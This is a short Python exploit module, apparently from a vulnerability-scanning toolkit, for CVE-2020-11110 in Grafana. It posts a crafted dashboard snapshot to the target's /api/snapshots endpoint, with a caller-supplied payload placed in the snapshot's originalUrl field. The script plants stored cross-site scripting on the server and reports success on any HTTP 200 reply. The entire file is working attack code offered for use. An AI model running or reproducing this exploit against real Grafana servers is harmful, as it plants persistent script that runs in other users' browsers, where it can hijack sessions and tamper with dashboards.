#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
urllib3.disable_warnings()


class Cve_2020_11110:

    def run(self, urls, poc):
        url = urls + '/api/snapshots'
        head = '{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"%s","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}'% (poc)
        # print(head)
        response = requests.post(url, data=head, headers=self.headers, verify=self.ssl, timeout=5,proxies=self.proxy)

        response.encoding = response.apparent_encoding
        if response.status_code == 200:
            OutPrintInfo("Grafana", 'Grafana-Xss执行完成')
            OutPrintInfo("Grafana",url)
        else:
            OutPrintInfo("Grafana", '不存在Grafana-Xss')

    def main(self, target):
        OutPrintInfo("Grafana",'开始执行Grafana-Xss')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        poc = target["poc"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy)
        
        self.run(url,poc)


        OutPrintInfo("Grafana",'Grafana-Xss执行结束')